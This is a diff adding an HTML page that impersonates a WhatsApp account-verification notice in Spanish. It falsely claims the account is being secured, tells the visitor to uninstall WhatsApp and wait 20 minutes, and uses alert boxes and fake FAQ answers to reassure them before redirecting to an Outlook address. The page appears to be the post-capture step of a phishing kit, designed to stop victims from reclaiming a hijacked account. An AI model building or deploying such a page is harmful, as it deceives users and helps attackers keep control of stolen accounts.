@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Verificación Correcta · Protección de Cuenta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1.5rem;
+            color: #1b1b1b;
+        }
+
+        .card {
+            max-width: 550px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.25rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.02);
+            overflow: hidden;
+        }
+
+        .content {
+            padding: 2rem 2rem 1.8rem 2rem;
+        }
+
+        .logo {
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .logo-svg {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-text {
+            font-weight: 600;
+            font-size: 1.25rem;
+            color: #2c2c2c;
+            letter-spacing: -0.2px;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            margin-bottom: 0.9rem;
+            color: #111;
+            line-height: 1.2;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .check-icon-title {
+            display: inline-block;
+            background-color: #2e7d32;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            text-align: center;
+            line-height: 32px;
+            color: white;
+            font-size: 1.3rem;
+            font-weight: bold;
+        }
+
+        .description {
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #3b3b3b;
+            margin-bottom: 1.5rem;
+            font-weight: 400;
+            text-align: center;
+            background-color: #f9fafb;
+            padding: 0.7rem 1rem;
+            border-radius: 1rem;
+        }
+
+        .description strong {
+            font-weight: 600;
+            color: #075e54;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #e6e6e6;
+            margin: 0.5rem 0 1.5rem 0;
+        }
+
+        .update-info {
+            background-color: #f3f4f6;
+            border-radius: 1rem;
+            padding: 1.2rem 1.5rem;
+            margin-bottom: 2rem;
+            border-left: 4px solid #2e7d32;
+            transition: all 0.2s;
+        }
+
+        .update-info p {
+            font-size: 0.95rem;
+            color: #1e2a3a;
+            margin-bottom: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .update-info p:last-child {
+            margin-bottom: 0;
+        }
+
+        .date-badge {
+            display: inline-block;
+            background-color: #e9ecef;
+            padding: 0.25rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #2e7d32;
+            margin-bottom: 0.9rem;
+            letter-spacing: 0.2px;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-next {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #0067b8;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.75rem 2rem;
+            border-radius: 0.25rem;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.05s linear;
+            text-decoration: none;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .btn-next:hover {
+            background-color: #0050a0;
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .footer-links {
+            margin-top: 2.2rem;
+            font-size: 0.75rem;
+            color: #6c6c6c;
+            border-top: 1px solid #ededed;
+            padding-top: 1.5rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .links-group {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4f4f4f;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 550px) {
+            .content {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .btn-next {
+                width: 100%;
+                justify-content: center;
+            }
+            .footer-links {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.8rem;
+            }
+            .links-group {
+                gap: 1rem;
+            }
+            .update-info {
+                padding: 1rem 1.2rem;
+            }
+        }
+
+        .btn-next:focus-visible, a:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+        }
+
+        .notice-highlight {
+            font-weight: 600;
+            color: #0067b8;
+            background: #e6f2fb;
+            border-radius: 12px;
+            padding: 0.15rem 0.4rem;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="content">
+        
+
+            <!-- Título central con verificación correcta -->
+            <h1>
+                <span class="check-icon-title">✓</span> Verificación correcta
+            </h1>
+            
+            <!-- Subtítulo corto estilo original -->
+            <div class="description">
+                <strong>Validación exitosa</strong> · Hemos aplicado medidas de seguridad para mantener tu cuenta protegida.
+            </div>
+
+            <!-- Bloque informativo principal con el mensaje detallado -->
+            <div class="update-info">
+                <div class="date-badge">🔐 Seguridad y privacidad</div>
+                <p>📌 <strong>Estimado usuario,</strong> le daremos un <strong>reinicio de sesión</strong> a su cuenta de WhatsApp para protegerla de cualquier inicio de sesión inusual. Espere <strong>20 minutos</strong> y vuelva a ingresar para finalizar con la validación de su cuenta.</p>
+                <p>⚠️ <strong>Antes de ingresar debe desinstalar la aplicación de WhatsApp</strong> para que la validación sea exitosa y pueda ingresar nuevamente sin inconvenientes. Puedes estar tranquil@, <strong>tus datos no se borrarán</strong> (chats, archivos y contactos permanecerán intactos).</p>
+                <p>✅ Una vez reinstalada la app después del tiempo indicado, podrás acceder con normalidad. Este proceso refuerza la seguridad de tu cuenta ante cualquier actividad sospechosa.</p>
+            </div>
+
+            <!-- Botón principal con llamada a la acción (aviso de recordatorio) -->
+            <div class="btn-container">
+                <button class="btn-next" id="actionButton" >Entendido</button>
+            </div>
+
+            <!-- Footer con enlaces de ayuda y copyright -->
+            <div class="footer-links">
+                <div class="links-group">
+                    <a href="#" id="helpCenterLink">Centro de seguridad</a>
+                    <a href="#" id="privacyNoticeLink">Aviso de privacidad WhatsApp</a>
+                    <a href="#" id="faqLink">Preguntas frecuentes</a>
+                </div>
+                <span>© 2026 · Verificación oficial</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+        function redi() {
+            location.href="https://outlook.live.com/mail/0"
+        }
+        // Función principal que muestra el recordatorio importante y refuerza las instrucciones
+        function mostrarRecordatorio() {
+            alert("🔔 RECUERDA:\n\n• Espera 20 minutos antes de volver a iniciar sesión.\n• DESINSTALA WhatsApp por completo antes de reinstalarlo.\n• Tus conversaciones, archivos y contactos NO se perderán.\n• Después del tiempo de espera y reinstalación, podrás ingresar sin problemas.\n\n¡Gracias por seguir estos pasos para proteger tu cuenta!");
+                    location.href="https://outlook.live.com/mail/0"
+}
+
+        // Asignar evento al botón principal
+        const actionBtn = document.getElementById('actionButton');
+        if (actionBtn) {
+            actionBtn.addEventListener('click', mostrarRecordatorio);
+        }
+
+        // Función genérica para enlaces informativos (muestran aviso sin redirección maliciosa)
+        function mostrarAviso(mensaje) {
+            alert(`ℹ️ ${mensaje}`);
+        }
+
+        // Enlaces del footer con información adicional (sin perder el diseño)
+        const helpLink = document.getElementById('helpCenterLink');
+        const privacyLink = document.getElementById('privacyNoticeLink');
+        const faqLink = document.getElementById('faqLink');
+
+        if (helpLink) {
+            helpLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                mostrarAviso('Visita el centro de ayuda oficial de WhatsApp para más información sobre seguridad de cuentas y verificación.');
+            });
+        }
+
+        if (privacyLink) {
+            privacyLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                mostrarAviso('La privacidad es prioridad. Tus datos personales y mensajes están protegidos durante este proceso de verificación.');
+            });
+        }
+
+        if (faqLink) {
+            faqLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                mostrarAviso('Pregunta frecuente: ¿Por qué debo desinstalar WhatsApp? Para eliminar tokens de sesión antiguos y asegurar un reinicio completo. Tus datos están respaldados en la nube si tienes copia activa.');
+            });
+        }
+
+        // También agregamos un pequeño efecto de consola para mantener coherencia (opcional)
+        console.log('Página de verificación correcta - Sigue las instrucciones de seguridad.');
+    </script>
+</body>
+</html>
